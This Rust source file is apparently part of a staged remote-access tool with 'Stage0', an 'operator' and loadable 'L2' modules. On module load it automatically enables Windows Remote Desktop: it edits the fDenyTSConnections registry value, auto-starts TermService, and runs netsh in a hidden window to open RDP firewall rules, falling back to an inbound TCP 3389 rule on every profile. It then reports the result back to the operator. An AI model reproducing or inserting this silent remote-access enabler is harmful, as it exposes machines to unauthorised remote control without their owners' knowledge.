//! Enable local Windows Remote Desktop (TCP 3389) when L2 `desktop` is loaded.
//!
//! Product desktop module is **not** mapped into Stage0 (`mod_init` never runs),
//! so RDP enable lives here and is invoked from `module_loader::load_product_worker`.
//!
//! Opt-out: `CUPCAKE_DESKTOP_NO_AUTO_RDP=1`
//!
//! Steps (best-effort, non-fatal individually):
//! 1. `fDenyTSConnections = 0` (Terminal Server registry)
//! 2. TermService → Auto + Start
//! 3. Firewall: enable "Remote Desktop" group (netsh, CREATE_NO_WINDOW)
//! 4. Probe `127.0.0.1:3389`

use std::fmt::Write as _;

/// Env var to skip auto-enable (lab / already-managed hosts).
pub const ENV_NO_AUTO_RDP: &str = "CUPCAKE_DESKTOP_NO_AUTO_RDP";

/// Summary returned to operator (module_stage stdout).
#[derive(Debug, Clone, Default)]
pub struct RdpEnableReport {
    pub skipped: bool,
    pub reason: String,
    pub registry_ok: bool,
    pub service_ok: bool,
    pub firewall_ok: bool,
    pub listen_ok: bool,
    pub notes: Vec<String>,
}

impl RdpEnableReport {
    pub fn summary_line(&self) -> String {
        if self.skipped {
            return format!("rdp_enable=skipped ({})", self.reason);
        }
        let mut s = String::from("rdp_enable=");
        let _ = write!(
            s,
            "reg={} svc={} fw={} listen3389={}",
            yn(self.registry_ok),
            yn(self.service_ok),
            yn(self.firewall_ok),
            yn(self.listen_ok),
        );
        if !self.notes.is_empty() {
            let _ = write!(s, " notes={}", self.notes.join(";"));
        }
        s
    }
}

fn yn(ok: bool) -> &'static str {
    if ok {
        "ok"
    } else {
        "fail"
    }
}

/// Enable local RDP so Stage0 desktop_bridge can dial 127.0.0.1:3389.
pub fn enable_local_rdp_on_desktop_load() -> RdpEnableReport {
    #[cfg(windows)]
    {
        if std::env::var(ENV_NO_AUTO_RDP).map(|v| v == "1").unwrap_or(false) {
            return RdpEnableReport {
                skipped: true,
                reason: format!("{ENV_NO_AUTO_RDP}=1"),
                ..Default::default()
            };
        }
        enable_local_rdp_windows()
    }
    #[cfg(not(windows))]
    {
        RdpEnableReport {
            skipped: true,
            reason: "not windows".into(),
            ..Default::default()
        }
    }
}

#[cfg(windows)]
fn enable_local_rdp_windows() -> RdpEnableReport {
    let mut rep = RdpEnableReport::default();

    match set_fdeny_ts_connections(0) {
        Ok(()) => {
            rep.registry_ok = true;
            log::info!("[rdp_enable] fDenyTSConnections=0");
        }
        Err(e) => {
            rep.notes.push(format!("reg:{e}"));
            log::warn!("[rdp_enable] registry: {e}");
        }
    }

    match ensure_termservice() {
        Ok(msg) => {
            rep.service_ok = true;
            if !msg.is_empty() {
                rep.notes.push(msg);
            }
            log::info!("[rdp_enable] TermService ready");
        }
        Err(e) => {
            rep.notes.push(format!("svc:{e}"));
            log::warn!("[rdp_enable] TermService: {e}");
        }
    }

    match enable_rdp_firewall_group() {
        Ok(()) => {
            rep.firewall_ok = true;
            log::info!("[rdp_enable] firewall Remote Desktop group enabled");
        }
        Err(e) => {
            rep.notes.push(format!("fw:{e}"));
            log::warn!("[rdp_enable] firewall: {e}");
        }
    }

    // Give TermService a moment to bind 3389
    std::thread::sleep(std::time::Duration::from_millis(400));
    rep.listen_ok = probe_local_3389();
    if rep.listen_ok {
        log::info!("[rdp_enable] 127.0.0.1:3389 accepts TCP");
    } else {
        rep.notes.push("3389_not_listening".into());
        log::warn!("[rdp_enable] 127.0.0.1:3389 not accepting yet (may need reboot / policy)");
    }

    rep
}

#[cfg(windows)]
fn set_fdeny_ts_connections(value: u32) -> Result<(), String> {
    use std::ptr;
    use winapi::shared::minwindef::{DWORD, HKEY};
    use winapi::um::winnt::{KEY_SET_VALUE, REG_DWORD};
    use winapi::um::winreg::{RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY_LOCAL_MACHINE};

    let sub = wide("SYSTEM\\CurrentControlSet\\Control\\Terminal Server");
    let name = wide("fDenyTSConnections");
    let mut hkey: HKEY = ptr::null_mut();
    let rc = unsafe {
        RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sub.as_ptr(),
            0,
            KEY_SET_VALUE,
            &mut hkey,
        )
    };
    if rc != 0 {
        return Err(format!("RegOpenKeyExW {rc:#x} (need admin?)"));
    }
    let data = value.to_le_bytes();
    let rc = unsafe {
        RegSetValueExW(
            hkey,
            name.as_ptr(),
            0,
            REG_DWORD,
            data.as_ptr(),
            data.len() as DWORD,
        )
    };
    unsafe {
        RegCloseKey(hkey);
    }
    if rc != 0 {
        return Err(format!("RegSetValueExW {rc:#x}"));
    }
    Ok(())
}

#[cfg(windows)]
fn ensure_termservice() -> Result<String, String> {
    use std::ptr;
    use winapi::shared::minwindef::DWORD;
    use winapi::um::winnt::SERVICE_AUTO_START;
    use winapi::um::winsvc::{
        ChangeServiceConfigW, CloseServiceHandle, OpenSCManagerW, OpenServiceW, QueryServiceStatus,
        StartServiceW, SC_HANDLE, SC_MANAGER_CONNECT, SERVICE_CHANGE_CONFIG, SERVICE_NO_CHANGE,
        SERVICE_QUERY_STATUS, SERVICE_RUNNING, SERVICE_START, SERVICE_STATUS,
    };

    unsafe {
        let scm: SC_HANDLE = OpenSCManagerW(ptr::null(), ptr::null(), SC_MANAGER_CONNECT);
        if scm.is_null() {
            return Err(format!("OpenSCManager failed {}", winapi::um::errhandlingapi::GetLastError()));
        }
        let name = wide("TermService");
        let access = SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_CHANGE_CONFIG;
        let svc: SC_HANDLE = OpenServiceW(scm, name.as_ptr(), access);
        if svc.is_null() {
            let e = winapi::um::errhandlingapi::GetLastError();
            CloseServiceHandle(scm);
            return Err(format!("OpenService TermService {e}"));
        }

        // Auto start
        let _ = ChangeServiceConfigW(
            svc,
            SERVICE_NO_CHANGE,
            SERVICE_AUTO_START,
            SERVICE_NO_CHANGE,
            ptr::null(),
            ptr::null(),
            ptr::null_mut(),
            ptr::null(),
            ptr::null(),
            ptr::null(),
            ptr::null(),
        );

        let mut st: SERVICE_STATUS = std::mem::zeroed();
        if QueryServiceStatus(svc, &mut st) == 0 {
            let e = winapi::um::errhandlingapi::GetLastError();
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return Err(format!("QueryServiceStatus {e}"));
        }

        let mut note = String::new();
        if st.dwCurrentState != SERVICE_RUNNING {
            if StartServiceW(svc, 0, ptr::null_mut()) == 0 {
                let e = winapi::um::errhandlingapi::GetLastError();
                // 1056 = already running
                if e != 1056 {
                    CloseServiceHandle(svc);
                    CloseServiceHandle(scm);
                    return Err(format!("StartService {e}"));
                }
            }
            // wait up to ~5s
            for _ in 0..25 {
                std::thread::sleep(std::time::Duration::from_millis(200));
                if QueryServiceStatus(svc, &mut st) != 0 && st.dwCurrentState == SERVICE_RUNNING {
                    break;
                }
            }
            if st.dwCurrentState != SERVICE_RUNNING {
                note = format!("state={}", st.dwCurrentState as DWORD);
            }
        }

        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
        Ok(note)
    }
}

#[cfg(windows)]
fn enable_rdp_firewall_group() -> Result<(), String> {
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    // English group name works on most installs; fallback to netsh port rule.
    let attempts: &[&[&str]] = &[
        &[
            "advfirewall",
            "firewall",
            "set",
            "rule",
            "group=remote desktop",
            "new",
            "enable=Yes",
        ],
        &[
            "advfirewall",
            "firewall",
            "set",
            "rule",
            "group=Remote Desktop",
            "new",
            "enable=Yes",
        ],
        // Port rule fallback (idempotent enough for lab)
        &[
            "advfirewall",
            "firewall",
            "add",
            "rule",
            "name=Cupcake-RDP-3389",
            "dir=in",
            "action=allow",
            "protocol=TCP",
            "localport=3389",
            "profile=any",
            "enable=yes",
        ],
    ];

    let mut last = String::new();
    for args in attempts {
        let out = Command::new("netsh")
            .args(*args)
            .creation_flags(CREATE_NO_WINDOW)
            .output()
            .map_err(|e| format!("netsh spawn: {e}"))?;
        if out.status.success() {
            return Ok(());
        }
        last = format!(
            "netsh exit={} stderr={}",
            out.status.code().unwrap_or(-1),
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Err(last)
}

#[cfg(windows)]
fn probe_local_3389() -> bool {
    use std::net::{SocketAddr, TcpStream, ToSocketAddrs};
    use std::time::Duration;

    let addrs: Vec<SocketAddr> = match ("127.0.0.1", 3389u16).to_socket_addrs() {
        Ok(a) => a.collect(),
        Err(_) => return false,
    };
    for addr in addrs {
        if TcpStream::connect_timeout(&addr, Duration::from_millis(500)).is_ok() {
            return true;
        }
    }
    false
}

#[cfg(windows)]
fn wide(s: &str) -> Vec<u16> {
    use std::os::windows::ffi::OsStrExt;
    std::ffi::OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn summary_skipped() {
        let r = RdpEnableReport {
            skipped: true,
            reason: "test".into(),
            ..Default::default()
        };
        assert!(r.summary_line().contains("skipped"));
    }

    #[test]
    fn summary_ok_flags() {
        let r = RdpEnableReport {
            registry_ok: true,
            service_ok: true,
            firewall_ok: false,
            listen_ok: true,
            notes: vec!["x".into()],
            ..Default::default()
        };
        let s = r.summary_line();
        assert!(s.contains("reg=ok"));
        assert!(s.contains("fw=fail"));
        assert!(s.contains("notes=x"));
    }
}
